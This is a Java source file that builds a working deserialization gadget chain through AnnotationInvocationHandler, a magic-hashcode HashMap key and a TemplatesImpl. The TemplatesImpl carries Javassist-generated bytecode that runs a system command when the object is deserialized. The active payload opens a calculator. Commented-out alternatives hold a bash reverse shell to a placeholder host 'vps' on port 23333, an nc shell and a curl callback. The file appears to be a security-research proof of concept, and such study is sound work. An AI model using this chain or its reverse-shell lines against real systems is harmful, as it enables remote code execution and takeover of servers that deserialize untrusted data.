package com.example;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Map;

public class equalsImplChain {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = getTemplatesImpl();

        String zeroHashCodeStr = "f5a5a608";

        // 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值
        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");

        // 实例化AnnotationInvocationHandler类
        Constructor handlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        handlerConstructor.setAccessible(true);
        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);

        // 为tempHandler创造一层代理
        Templates proxy = (Templates) Proxy.newProxyInstance(equalsImplChain.class.getClassLoader(), new Class[]{Templates.class}, tempHandler);

        // 实例化HashSet，并将两个对象放进去
        HashSet set = new LinkedHashSet();
        set.add(templates);
        set.add(proxy);
//        HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
//        objectObjectHashMap.put(tempHandler,"");
//        objectObjectHashMap.put(proxy,"");


        // 将恶意templates设置到map中
        map.put(zeroHashCodeStr, templates);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(set);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] GenerateEvil() throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, ctClass);
        String plateform = System.getProperties().getProperty("os.name");
        String command = "";
        if(command.isEmpty()){
            if (plateform.contains("Windows")){
                command = "calc.exe";
            }else if (plateform.contains("Linux")){
                command = "xcalc";
            }else if (plateform.contains("Mac")){
                command = "open -a Calculator";
            }
        }
        constructor.setBody("Runtime.getRuntime().exec(\""+command+"\");");
//        constructor.setBody("Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/vps/23333 0>&1\");");
//        constructor.setBody("Runtime.getRuntime().exec(\"nc vps 23333 -e /bin/sh\");");
//        constructor.setBody("Runtime.getRuntime().exec(\"curl vps:23333\");");
        ctClass.addConstructor(constructor);
//        return cleanBytecode(ctClass.toBytecode());
        return ctClass.toBytecode();
    }

    public static TemplatesImpl getTemplatesImpl() throws Exception{
        byte[][] bytes = new byte[][]{GenerateEvil()};
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", bytes);
        setFieldValue(templates, "_name", "");
        setFieldValue(templates, "_tfactory", null);
        return templates;
    }
}